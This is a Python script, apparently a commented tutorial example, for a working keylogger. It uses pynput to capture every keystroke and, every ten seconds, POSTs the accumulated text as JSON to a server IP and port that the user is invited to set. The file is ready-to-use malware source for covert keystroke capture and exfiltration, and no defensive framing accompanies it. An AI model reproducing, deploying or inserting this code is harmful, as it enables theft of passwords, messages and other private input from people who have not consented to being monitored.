from pynput import keyboard
import requests
import json
import threading
# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""
#add your server info,port and interval
ip_address = "127.0.0.1"
port_number = "8080"
time_interval = 10

def send_post_req():
    try:
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
       # We start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")
      
# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.

with keyboard.Listener(on_press=on_press) as listener:
   # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
